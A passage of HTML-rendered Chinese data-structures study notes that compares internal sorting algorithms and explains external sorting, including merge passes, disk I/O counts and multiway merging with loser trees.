<td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span></td>
<td style="text-align:center">是</td>
</tr>
<tr>
<td style="text-align:center">基数排序</td>
<td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>d</mi><mo stretchy="false">(</mo><mi>n</mi><mo>+</mo><mi>r</mi><mo stretchy="false">)</mo><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(d(n + r))</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mclose">))</span></span></span></span></td>
<td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>d</mi><mo stretchy="false">(</mo><mi>n</mi><mo>+</mo><mi>r</mi><mo stretchy="false">)</mo><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(d(n + r))</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mclose">))</span></span></span></span></td>
<td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>d</mi><mo stretchy="false">(</mo><mi>n</mi><mo>+</mo><mi>r</mi><mo stretchy="false">)</mo><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(d(n + r))</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mclose">))</span></span></span></span></td>
<td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>r</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(r)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mclose">)</span></span></span></span></td>
<td style="text-align:center">是</td>
</tr>
</tbody>
</table>
<h4> 内部排序算法的应用</h4>
<p>通常情况，对排序算法的比较和应用应考虑以下情况。</p>
<ol>
<li>
<p><strong>选取排序方法需要考虑的因素</strong></p>
<ul>
<li>待排序的元素数目 <code>n</code></li>
<li>元素本身信息量的大小</li>
<li>关键字的结构及其分布情况</li>
<li>稳定性的要求</li>
<li>语言工具的条件，存储结构及辅助空间的大小等</li>
</ul>
</li>
<li>
<p><strong>排序算法小结</strong></p>
<ul>
<li>若 <code>n</code> 较小，可采用直接插入排序或简单选择排序。由于直接插入排序所需的记录移动次数较简单选择排序的多，因而当记录本身信息量较大时，用简单选择排序较好</li>
<li>若文件的初始状态已按关键字基本有序，则选用直接插入或冒泡排序为宜</li>
<li>若 <code>n</code> 较大，则应采用时间复杂度为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mi>l</mi><mi>o</mi><msub><mi>g</mi><mn>2</mn></msub><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n log_{2} n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span> 的排序方法：快速排序、堆排序或归并排序。快速排序被认为是目前基于比较的内部排序方法中最好的方法，当待排序的关键字随机分布时，快速排序的平均时间最短。堆排序所需的辅助空间少于快速排序，并且不会出现快速排序可能出现的最坏情况，这两种排序都是不稳定的。若要求排序稳定且时间复杂度为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mi>l</mi><mi>o</mi><msub><mi>g</mi><mn>2</mn></msub><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n log_{2} n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span>，则可选用归并排序。但从单个记录起进行两两归并的排序算法并不值得提倡，通常可以将它和直接插入排序结合在一起使用。先利用直接插入排序求得较长的有序子文件，然后两两归并。直接插入排序是稳定的，因此改进后的归并排序仍是稳定的</li>
<li>在基于比较的排序方法中，每次比较两个关键字的大小之后，仅出现两种可能的转移，因此可以用一棵二叉树来描述比较判定过程，由此可以证明：当文件的 <code>n</code> 个关键字随机分布时，任何借助于 “比较” 的排序算法，至少需要 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mi>l</mi><mi>o</mi><msub><mi>g</mi><mn>2</mn></msub><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n log_{2} n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span> 的时间</li>
<li>若 <code>n</code> 很大，记录的关键字位数较少且可以分解时，采用基数排序较好</li>
<li>当记录本身信息量较大时，为避免耗费大量时间移动记录，可用链表作为存储结构</li>
</ul>
</li>
</ol>
<h3> 外部排序</h3>
<ul>
<li>外部排序指待排序文件较大，内存一次放不下，需存放在外存的文件的排序</li>
<li>为减少平衡归并中外存读写次数所采取的方法：增大归并路数和减少归并段个数</li>
<li>利用败者树增大归并路数</li>
<li>利用置换-选择排序增大归并段长度来减少归并段个数</li>
<li>由长度不等的归并段，进行多路平衡归并，需要构造最佳归并树</li>
</ul>
<h4> 外部排序的基本概念</h4>
<p>前面介绍过的排序方法都是在内存中进行的（称为 <strong>内部排序</strong>）。而在许多应用中，经常需要对大文件进行排序，因为文件中的记录很多，无法将整个文件复制进内存中进行排序。因此，需要将待排序的记录存储在外存上，排序时再把数据一部分一部分地调入内存进行排序，在排序过程中需要多次进行内存和外存之间的交换。这种排序方法就称为 <strong>外部排序。</strong></p>
<h4> 外部排序的方法</h4>
<p>文件通常是按块存储在磁盘上的，操作系统也是按块对磁盘上的信息进行读写的。因为磁盘读/写的机械动作所需的时间远远超过内存运算的时间（相比而言可以忽略不计），因此在外部排序过程中的时间代价主要考虑访问磁盘的次数，即 <code>I/O</code> 次数。</p>
<p>外部排序通常采用归并排序法。它包括两个阶段：</p>
<ol>
<li>根据内存缓冲区大小，将外存上的文件分成若干长度为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">ℓ</mi></mrow><annotation encoding="application/x-tex">\ell</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord">ℓ</span></span></span></span> 的子文件，依次入内存并利用内部排序方法对它们进行排序，并将排序后得到的有序子文件重新写回外存，称这些有序子文件为 <strong>归并段</strong> 或 <strong>顺串</strong></li>
<li>对这些归并段进行逐趟归并，使归并段（有序子文件）逐渐由小到大，直至得到整个有序文件为止</li>
</ol>
<p>例如：一个含有 <code>2000</code> 个记录的文件，每个磁盘块可容纳 <code>125</code> 个记录，首先通过 <code>8</code> 次内部排序得到 <code>8</code> 个初始归并段 <code>R1~R8</code>，每个段都含 <code>250</code> 个记录。然后对该文件做两两归并，直至得到一个有序文件。可以把内存工作区等分为 <code>3</code> 个缓冲区，其中的两个为输入缓冲区，一个为输出缓冲区。首先，从两个输入归并段 <code>R1</code> 和 <code>R2</code> 中分别读入一个块，放在输入缓冲区 <code>1</code> 和输入缓冲区 <code>2</code> 中。然后，在内存中进行 2 路归并，归并后的对象顺序存放在输出缓冲区中。若输出缓冲区中对象存满，则将其顺序写到输出归并段（<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>R</mi><msup><mn>1</mn><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup></mrow><annotation encoding="application/x-tex">R1'</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7519em;"></span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mord"><span class="mord">1</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span></span></span></span>）中，再清空输出缓冲区，继续存放归并后的对象。若某个输入缓冲区中的对象取空，则从对应的输入归并段中再读取下一块，继续参加归并。如此继续，直到两个输入归并段中的对象全部读入内存并都归并完成为止。</p>
<p>在外部排序中实现两两归并时，由于不可能将两个有序段及归并结果段同时存放在内存中，因此需要不停地将数据读出、写入磁盘，而这会耗费大量的时间。一般情况下：<em>外部排序的总时间 = 内部排序所需的时间 + 外存信息读写的时间 + 内部归并所需的时间</em>。显然，外存信息读写的时间远大于内部排序和内部归并的时间，因此应着力减少 <code>I/O</code> 次数。 由于外存信息的读/写是以 “磁盘块” 为单位的，可知每一趟归并需进行 <code>16</code> 次 “读” 和 <code>16</code> 次 “写”，例如：<code>3</code> 趟归并加上内部排序时所需进行的读/写，使得总共需进行 <code>32 x 3 + 32 = 128</code> 次读写。</p>
<p>若改用 4 路归并排序，则只需 <code>2</code> 趟归并，外部排序时的总读/写次数便减至 <code>32 * 2 + 32 = 96</code>。因此，增大归并路数，可减少归并趟数，进而减少总的磁盘 <code>I/O</code> 次数。</p>
<p>一般地，对 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>r</mi></mrow><annotation encoding="application/x-tex">r</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span></span></span></span> 个初始归并段，做 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span> 路平衡归并，归并树可用严格 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span> 叉树（即只有度为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span> 与度为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn></mrow><annotation encoding="application/x-tex">0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">0</span></span></span></span> 的结点的 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span> 叉树）来表示。第一趟可将 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>r</mi></mrow><annotation encoding="application/x-tex">r</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span></span></span></span> 个初始归并段归并为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">⌈</mo><mi>r</mi><mi mathvariant="normal">/</mi><mi>k</mi><mo stretchy="false">⌉</mo></mrow><annotation encoding="application/x-tex">\lceil r / k \rceil</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">⌈</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord">/</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mclose">⌉</span></span></span></span> 个归并段，以后每趟归并将 <code>m</code> 个归并段归并成 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">⌈</mo><mi>m</mi><mi mathvariant="normal">/</mi><mi>k</mi><mo stretchy="false">⌉</mo></mrow><annotation encoding="application/x-tex">\lceil m / k \rceil</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">⌈</span><span class="mord mathnormal">m</span><span class="mord">/</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mclose">⌉</span></span></span></span> 个归并段，直至最后形成一个大的归并段为止。树的高度 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>−</mo><mn>1</mn><mo>=</mo><mo stretchy="false">⌈</mo><mi>l</mi><mi>o</mi><msub><mi>g</mi><mi>k</mi></msub><mi>r</mi><mo stretchy="false">⌉</mo><mo>=</mo><mtext>归并趟数</mtext><mi>S</mi></mrow><annotation encoding="application/x-tex">-1 = \lceil log_{k} r \rceil = \text{归并趟数} S</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">−</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">⌈</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mclose">⌉</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord text"><span class="mord cjk_fallback">归并趟数</span></span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span></span></span></span>。可见，只要增大归并路数 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span> 或减少初始归并段个数 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>r</mi></mrow><annotation encoding="application/x-tex">r</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span></span></span></span>，都能减少归并趟数 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>S</mi></mrow><annotation encoding="application/x-tex">S</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span></span></span></span>，进而减少读写磁盘的次数，达到提高外部排序速度的目的。</p>
<h4> 多路平衡归并与败者树</h4>
<p>增加归并路数 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span> 能减少归并趟数 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>S</mi></mrow><annotation encoding="application/x-tex">S</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span></span></span></span>，进而减少 <code>I/O</code> 次数。然而，增加归并路数 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span> 时，内部归并的时间将增加。做内部归并时，在 <code>k</code> 个元素中选择关键字最小的记录需要比较 <code>k - 1</code> 次。每趟归并 <code>n</code> 个元素需要做 <code>(n - 1)(k - 1)</code> 次比较，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>S</mi></mrow><annotation encoding="application/x-tex">S</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span></span></span></span> 趟归并总共需要的比较次数为：<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>S</mi><mo stretchy="false">(</mo><mi>n</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo><mo stretchy="false">(</mo><mi>k</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo><mo>=</mo><mo stretchy="false">⌈</mo><mi>l</mi><mi>o</mi><msub><mi>g</mi><mi>k</mi></msub><mi>r</mi><mo stretchy="false">⌉</mo><mo stretchy="false">(</mo><mi>n</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo><mo stretchy="false">(</mo><mi>k</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo><mo>=</mo><mo stretchy="false">⌈</mo><mi>l</mi><mi>o</mi><msub><mi>g</mi><mi>k</mi></msub><mi>r</mi><mo stretchy="false">⌉</mo><mo stretchy="false">(</mo><mi>n</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo><mo stretchy="false">(</mo><mi>k</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo><mi mathvariant="normal">/</mi><mo stretchy="false">⌈</mo><mi>l</mi><mi>o</mi><msub><mi>g</mi><mn>2</mn></msub><mi>k</mi><mo stretchy="false">⌉</mo></mrow><annotation encoding="application/x-tex">S(n - 1)(k - 1) = \lceil log_{k} r \rceil (n - 1)(k - 1) = \lceil log_{k} r \rceil (n - 1)(k - 1) / \lceil log_{2} k \rceil</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">⌈</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mclose">⌉</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">⌈</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mclose">⌉</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mord">/</span><span class="mopen">⌈</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mclose">⌉</span></span></span></span> 式中，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mi>k</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo><mi mathvariant="normal">/</mi><mo stretchy="false">⌈</mo><mi>l</mi><mi>o</mi><msub><mi>g</mi><mn>2</mn></msub><mi>k</mi><mo stretchy="false">⌉</mo></mrow><annotation encoding="application/x-tex">(k - 1) / \lceil log_{2} k \rceil</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mord">/</span><span class="mopen">⌈</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span 